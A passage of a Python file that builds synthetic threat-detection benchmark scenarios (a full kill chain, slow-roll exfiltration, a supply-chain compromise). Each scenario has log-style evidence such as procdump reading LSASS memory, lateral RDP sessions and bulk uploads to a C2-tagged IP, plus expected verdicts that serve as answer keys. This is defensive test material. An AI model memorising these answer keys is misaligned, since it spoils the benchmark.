        _make_fact(prefix, 7, "cred-lsass", EntityType.NODE, "lsass_access_granted",
                   "PROCESS_VM_READ from procdump64.exe (PID 7892)",
                   datetime(2026, 2, 14, 8, 5, 1),
                   SourceType.PROCESS_LIST, src),
        # Phase 3: Lateral movement
        _make_fact(prefix, 8, "lateral-1", EntityType.EDGE, "remote_desktop_session",
                   "compromised_user -> SERVER-DB01 (10.0.1.20)",
                   datetime(2026, 2, 14, 9, 0, 0),
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 9, "lateral-2", EntityType.EDGE, "remote_desktop_session",
                   "compromised_user -> SERVER-APP01 (10.0.1.30)",
                   datetime(2026, 2, 14, 9, 15, 0),
                   SourceType.AUTH_LOG, src),
        _make_fact(prefix, 10, "lateral-3", EntityType.EDGE, "smb_lateral_traffic",
                   "SMB file share access from 10.0.1.30 to FILE-SERVER (10.0.1.50)",
                   datetime(2026, 2, 14, 9, 30, 0),
                   SourceType.NETFLOW, src),
        # Phase 4: Data staging and exfil
        _make_fact(prefix, 11, "staging", EntityType.NODE, "file_copy_operation",
                   "Bulk copy from \\\\FILE-SERVER\\confidential\\ to C:\\Temp\\exfil\\",
                   datetime(2026, 2, 14, 10, 0, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 12, "compress", EntityType.NODE, "process_name",
                   "C:\\Windows\\System32\\tar.exe",
                   datetime(2026, 2, 14, 10, 15, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 13, "compress", EntityType.NODE, "command_line",
                   "tar.exe -czf C:\\Temp\\data.tar.gz C:\\Temp\\exfil\\",
                   datetime(2026, 2, 14, 10, 15, 0),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 14, "exfil-conn", EntityType.EDGE, "network_connection",
                   "HTTPS outbound to 198.51.100.77:443 — 85MB transferred",
                   datetime(2026, 2, 14, 10, 30, 0),
                   SourceType.NETFLOW, src),
        _make_fact(prefix, 15, "exfil-ip", EntityType.EDGE, "remote_ip_reputation",
                   "198.51.100.77: Known C2 infrastructure (threat intel match)",
                   datetime(2026, 2, 14, 10, 30, 0),
                   SourceType.NETFLOW, src),
        _make_fact(prefix, 16, "user-exec01", EntityType.NODE, "logon_account",
                   "CORP\\exec_assistant01",
                   ts_base, SourceType.AUTH_LOG, src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-010",
        name="Multi-Vector Campaign",
        description="Full kill chain: macro → shell → cred dump → lateral movement → exfiltration",
        mitre_attack_ids=("T1566", "T1059", "T1003", "T1021", "T1041"),
        mitre_tactic="Multiple (kill chain)",
        difficulty_tier=4,
        expected_verdict="THREAT_CONFIRMED",
        expected_winner="ARCHITECT",
        fact_count=len(facts),
        notes="Tier 4 — 16 facts across the full MITRE kill chain; tests system at scale",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


def build_sc011_slow_roll_exfil() -> BenchmarkScenario:
    """SC-011: Slow-roll exfiltration.

    Small HTTPS uploads (<1MB) to cloud storage every 4 hours.
    No other malicious indicators.  Sparse evidence should produce
    uncertainty.
    """
    ts_base = datetime(2026, 2, 14, 6, 0, 0)
    prefix = "sc011"
    src = "ws-research-03:Security:2026-02-14T06:00:00Z"

    packet = EvidencePacket(
        packet_id=f"{prefix}-slow-exfil",
        time_window=TimeWindow(
            start=datetime(2026, 2, 14, 0, 0, 0),
            end=datetime(2026, 2, 14, 23, 59, 0),
        ),
    )

    facts = [
        _make_fact(prefix, 1, "upload-1", EntityType.EDGE, "network_connection",
                   "HTTPS upload to storage.cloudprovider.com:443 — 0.8MB at 02:00",
                   datetime(2026, 2, 14, 2, 0, 0),
                   SourceType.NETFLOW, src),
        _make_fact(prefix, 2, "upload-2", EntityType.EDGE, "network_connection",
                   "HTTPS upload to storage.cloudprovider.com:443 — 0.6MB at 06:00",
                   datetime(2026, 2, 14, 6, 0, 0),
                   SourceType.NETFLOW, src),
        _make_fact(prefix, 3, "upload-3", EntityType.EDGE, "network_connection",
                   "HTTPS upload to storage.cloudprovider.com:443 — 0.9MB at 10:00",
                   datetime(2026, 2, 14, 10, 0, 0),
                   SourceType.NETFLOW, src),
        _make_fact(prefix, 4, "user-research03", EntityType.NODE, "logon_account",
                   "CORP\\researcher03 — uses cloud storage for project collaboration",
                   ts_base, SourceType.AUTH_LOG, src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-011",
        name="Slow-Roll Exfiltration",
        description="Periodic small HTTPS uploads to cloud storage with no other malicious indicators",
        mitre_attack_ids=("T1041",),
        mitre_tactic="Exfiltration",
        difficulty_tier=4,
        expected_verdict="INCONCLUSIVE",
        expected_winner="BALANCED",
        fact_count=len(facts),
        notes="Tier 4 — only 4 facts; sparse evidence should produce high uncertainty",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


def build_sc012_supply_chain_compromise() -> BenchmarkScenario:
    """SC-012: Supply chain compromise.

    Legitimate software update from trusted vendor with valid signature,
    but the updater makes an unexpected network callback and spawns an
    anomalous child process.
    """
    ts_base = datetime(2026, 2, 14, 3, 0, 0)
    prefix = "sc012"
    src = "ws-dev-09:Security:2026-02-14T03:00:00Z"

    packet = EvidencePacket(
        packet_id=f"{prefix}-supply-chain",
        time_window=TimeWindow(
            start=datetime(2026, 2, 14, 2, 30, 0),
            end=datetime(2026, 2, 14, 4, 0, 0),
        ),
    )

    facts = [
        _make_fact(prefix, 1, "proc-updater", EntityType.NODE, "process_name",
                   "C:\\Program Files\\TrustedVendor\\updater.exe",
                   ts_base, SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 2, "proc-updater", EntityType.NODE, "file_signature_status",
                   "Authenticode signed by TrustedVendor Inc. — valid certificate chain",
                   ts_base, SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 3, "update-download", EntityType.EDGE, "network_connection",
                   "HTTPS download from update.trustedvendor.com:443 — signed package",
                   datetime(2026, 2, 14, 3, 0, 5),
                   SourceType.NETFLOW, src),
        _make_fact(prefix, 4, "callback-suspicious", EntityType.EDGE, "network_connection",
                   "HTTPS callback to 192.0.2.99:443 — not in TrustedVendor IP range",
                   datetime(2026, 2, 14, 3, 1, 0),
                   SourceType.NETFLOW, src),
        _make_fact(prefix, 5, "child-proc", EntityType.NODE, "process_name",
                   "C:\\Windows\\System32\\rundll32.exe",
                   datetime(2026, 2, 14, 3, 1, 5),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 6, "child-proc", EntityType.NODE, "parent_process",
                   "updater.exe — unexpected child process for software updater",
                   datetime(2026, 2, 14, 3, 1, 5),
                   SourceType.PROCESS_LIST, src),
        _make_fact(prefix, 7, "child-proc", EntityType.NODE, "command_line",
                   "rundll32.exe C:\\ProgramData\\TrustedVendor\\plugin.dll,EntryPoint",
                   datetime(2026, 2, 14, 3, 1, 5),
                   SourceType.PROCESS_LIST, src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-012",
        name="Supply Chain Compromise",
        description="Trusted vendor update with valid signature but unexpected network callback and child process",
        mitre_attack_ids=("T1195",),
        mitre_tactic="Initial Access",
        difficulty_tier=4,
        expected_verdict="INCONCLUSIVE",
        expected_winner="BALANCED",
        fact_count=len(facts),
        notes="Tier 4 — hardest scenario; trusted source + suspicious behavior = deep ambiguity",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


# =============================================================================
# Public API
# =============================================================================

def get_all_scenarios() -> tuple[BenchmarkScenario, ...]:
    """Return all 12 benchmark scenarios as a frozen tuple."""
    return tuple([
        build_sc001_privilege_escalation(),
        build_sc002_suspicious_process_chain(),
        build_sc003_credential_dumping(),
        build_sc004_lolbins(),
        build_sc005_lateral_movement_rdp(),
        build_sc006_data_staging(),
        build_sc007_insider_threat(),
        build_sc008_benign_av_update(),
        build_sc009_authorized_red_team(),
        build_sc010_multi_vector_campaign(),
        build_sc011_slow_roll_exfil(),
        build_sc012_supply_chain_compromise(),
    ])


def get_scenarios_by_tier(tier: int) -> tuple[BenchmarkScenario, ...]:
    """Return scenarios for a specific difficulty tier (1-4).

    Args:
        tier: Difficulty tier to filter by (1-4).

    Returns:
        Tuple of BenchmarkScenarios matching the given tier.

    Raises:
        ValueError: If tier is not in 1-4.
    """
    if tier not in (1, 2, 3, 4):
        raise ValueError(f"Tier must be 1-4, got {tier}")
    return tuple(s for s in get_all_scenarios()
                 if s.metadata.difficulty_tier == tier)


def get_scenario_by_id(scenario_id: str) -> BenchmarkScenario:
    """Return a specific scenario by its ID (e.g., 'SC-001').

    Args:
        scenario_id: The scenario ID to look up.

    Returns:
        The matching BenchmarkScenario.

    Raises:
        KeyError: If no scenario with the given ID exists.
    """
    _index: Dict[str, BenchmarkScenario] = {
        s.metadata.scenario_id: s for s in get_all_scenarios()
    }
    if scenario_id not in _index:
        raise KeyError(f"No scenario with ID '{scenario_id}'")
    return _index[scenario_id]
